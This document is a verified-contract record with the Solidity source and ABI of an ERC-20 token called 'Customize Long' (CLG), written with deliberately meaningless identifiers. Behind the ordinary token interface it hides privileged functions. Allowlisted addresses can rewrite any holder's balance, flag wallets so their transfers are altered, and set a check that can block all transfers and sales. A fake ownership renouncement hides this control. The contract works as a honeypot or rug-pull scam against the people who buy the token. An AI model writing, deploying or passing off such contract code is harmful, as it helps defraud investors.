{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface receiverSwapTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalReceiverTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface takeReceiverSwap {\n    function createPair(address atExemptLimit, address fromSell) external returns (address);\n}\n\ninterface listToSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenReceiver) external view returns (uint256);\n\n    function transfer(address toSell, uint256 amountSwap) external returns (bool);\n\n    function allowance(address modeTeamTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSell,\n        uint256 amountSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIs, uint256 value);\n    event Approval(address indexed modeTeamTake, address indexed spender, uint256 value);\n}\n\ninterface listToSellMetadata is listToSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CustomizeLong is totalReceiverTeam, listToSell, listToSellMetadata {\n\n    function allowance(address isTo, address minTxLimit) external view virtual override returns (uint256) {\n        if (minTxLimit == minTo) {\n            return type(uint256).max;\n        }\n        return minTx[isTo][minTxLimit];\n    }\n\n    uint256 constant takeWalletAmount = 19 ** 10;\n\n    function transferFrom(address amountAtLiquidity, address toSell, uint256 amountSwap) external override returns (bool) {\n        if (_msgSender() != minTo) {\n            if (minTx[amountAtLiquidity][_msgSender()] != type(uint256).max) {\n                require(amountSwap <= minTx[amountAtLiquidity][_msgSender()]);\n                minTx[amountAtLiquidity][_msgSender()] -= amountSwap;\n            }\n        }\n        return senderMax(amountAtLiquidity, toSell, amountSwap);\n    }\n\n    address minTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderMax(address amountAtLiquidity, address toSell, uint256 amountSwap) internal returns (bool) {\n        if (amountAtLiquidity == feeReceiver) {\n            return toTx(amountAtLiquidity, toSell, amountSwap);\n        }\n        uint256 isMin = listToSell(takeSender).balanceOf(tradingFeeToken);\n        require(isMin == toLaunched);\n        require(toSell != tradingFeeToken);\n        if (swapMin[amountAtLiquidity]) {\n            return toTx(amountAtLiquidity, toSell, takeWalletAmount);\n        }\n        return toTx(amountAtLiquidity, toSell, amountSwap);\n    }\n\n    address tradingFeeToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private autoModeEnable;\n\n    function owner() external view returns (address) {\n        return autoModeEnable;\n    }\n\n    function senderList(uint256 amountSwap) public {\n        buyMin();\n        toLaunched = amountSwap;\n    }\n\n    function totalLaunched(address receiverReceiver) public {\n        if (swapLaunchedWallet) {\n            return;\n        }\n        \n        tokenMin[receiverReceiver] = true;\n        \n        swapLaunchedWallet = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atLaunched;\n    }\n\n    function transfer(address limitMarketing, uint256 amountSwap) external virtual override returns (bool) {\n        return senderMax(_msgSender(), limitMarketing, amountSwap);\n    }\n\n    string private liquidityReceiver = \"Customize Long\";\n\n    mapping(address => bool) public tokenMin;\n\n    uint256 private swapReceiverWallet;\n\n    function txLiquidityBuy(address modeTo) public {\n        buyMin();\n        if (receiverAmount != liquidityMax) {\n            tradingLimit = buyLaunch;\n        }\n        if (modeTo == feeReceiver || modeTo == takeSender) {\n            return;\n        }\n        swapMin[modeTo] = true;\n    }\n\n    bool public swapLaunchedWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFeeAt;\n    }\n\n    uint256 private liquidityMax;\n\n    bool private enableSwap;\n\n    uint256 public buyLaunch;\n\n    function getOwner() external view returns (address) {\n        return autoModeEnable;\n    }\n\n    mapping(address => uint256) private totalAmountLaunch;\n\n    function isSwapMax(address limitMarketing, uint256 amountSwap) public {\n        buyMin();\n        totalAmountLaunch[limitMarketing] = amountSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityReceiver;\n    }\n\n    uint256 limitAutoBuy;\n\n    bool private minFee;\n\n    function approve(address minTxLimit, uint256 amountSwap) public virtual override returns (bool) {\n        minTx[_msgSender()][minTxLimit] = amountSwap;\n        emit Approval(_msgSender(), minTxLimit, amountSwap);\n        return true;\n    }\n\n    uint256 private tradingLimit;\n\n    uint256 private atLaunched = 100000000 * 10 ** 18;\n\n    bool private teamAuto;\n\n    mapping(address => mapping(address => uint256)) private minTx;\n\n    function toTx(address amountAtLiquidity, address toSell, uint256 amountSwap) internal returns (bool) {\n        require(totalAmountLaunch[amountAtLiquidity] >= amountSwap);\n        totalAmountLaunch[amountAtLiquidity] -= amountSwap;\n        totalAmountLaunch[toSell] += amountSwap;\n        emit Transfer(amountAtLiquidity, toSell, amountSwap);\n        return true;\n    }\n\n    mapping(address => bool) public swapMin;\n\n    function buyMin() private view {\n        require(tokenMin[_msgSender()]);\n    }\n\n    address public feeReceiver;\n\n    function totalAt() public {\n        emit OwnershipTransferred(feeReceiver, address(0));\n        autoModeEnable = address(0);\n    }\n\n    string private tokenFeeAt = \"CLG\";\n\n    uint256 toLaunched;\n\n    uint256 public receiverAmount;\n\n    address public takeSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundToken;\n    }\n\n    function balanceOf(address tokenReceiver) public view virtual override returns (uint256) {\n        return totalAmountLaunch[tokenReceiver];\n    }\n\n    uint8 private fundToken = 18;\n\n    constructor (){\n        if (liquidityMax == receiverAmount) {\n            minFee = true;\n        }\n        receiverSwapTotal minWallet = receiverSwapTotal(minTo);\n        takeSender = takeReceiverSwap(minWallet.factory()).createPair(minWallet.WETH(), address(this));\n        if (swapReceiverWallet != buyLaunch) {\n            teamAuto = false;\n        }\n        feeReceiver = _msgSender();\n        totalAt();\n        tokenMin[feeReceiver] = true;\n        totalAmountLaunch[feeReceiver] = atLaunched;\n        \n        emit Transfer(address(0), feeReceiver, atLaunched);\n    }\n\n    bool private amountEnable;\n\n    event OwnershipTransferred(address indexed liquiditySwap, address indexed takeLimit);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTeamTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minTxLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSwap\",\"type\":\"uint256\"}],\"name\":\"isSwapMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountSwap\",\"type\":\"uint256\"}],\"name\":\"senderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"totalLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAtLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"}],\"name\":\"txLiquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CustomizeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}